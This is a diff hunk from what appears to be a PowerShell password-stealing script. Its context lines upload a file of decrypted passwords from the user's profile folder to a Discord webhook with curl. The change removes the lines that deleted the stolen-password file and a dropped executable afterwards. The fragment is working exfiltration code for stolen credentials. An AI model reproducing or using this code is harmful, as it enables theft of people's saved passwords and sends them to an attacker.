@@ -32,7 +32,6 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
 
-get-childItem * -Include *decrypted_password.csv -Recurse | rm
-rm "$env:USERPROFILE\d.exe"
+
 
 
